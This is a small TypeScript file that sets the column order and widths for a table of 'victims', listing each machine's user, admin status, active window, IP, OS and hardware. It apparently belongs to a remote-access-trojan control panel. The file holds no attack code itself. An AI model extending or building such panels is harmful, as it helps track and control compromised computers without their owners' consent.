export type VictimsColumnKey =
   | "h-country"
   | "h-icon"
   | "h-user"
   | "h-admin"
   | "h-pc-name"
   | "h-window"
   | "h-last-active"
   | "h-id"
   | "h-ip"
   | "h-os"
   | "h-cpu"
   | "h-ram"
   | "h-gpu"
   | "h-comment";

export const DEFAULT_VICTIMS_COLUMN_ORDER: VictimsColumnKey[] = [
   "h-country",
   "h-icon",
   "h-user",
   "h-admin",
   "h-pc-name",
   "h-window",
   "h-last-active",
   "h-id",
   "h-ip",
   "h-os",
   "h-cpu",
   "h-ram",
   "h-gpu",
   "h-comment",
];

export function victimsColumnSizeClass(key: VictimsColumnKey): string {
   switch (key) {
      case "h-country":
         return "w-[38px] min-w-[38px]";
      case "h-icon":
         return "w-[40px] min-w-[40px]";
      case "h-user":
         return "w-[110px] min-w-[110px]";
      case "h-admin":
         return "w-[80px] min-w-[80px]";
      case "h-pc-name":
         return "w-[140px] min-w-[140px]";
      case "h-window":
         return "w-[230px] min-w-[230px]";
      case "h-ip":
         return "w-[120px] min-w-[120px]";
      case "h-comment":
         return "w-[110px] min-w-[110px]";
      case "h-last-active":
         return "w-[110px] min-w-[110px]";
      case "h-os":
         return "w-[130px] min-w-[130px]";
      case "h-id":
         return "w-[150px] min-w-[150px]";
      case "h-cpu":
         return "w-[140px] min-w-[140px]";
      case "h-ram":
         return "w-[90px] min-w-[90px]";
      case "h-gpu":
         return "w-[140px] min-w-[140px]";
      default:
         return "";
   }
}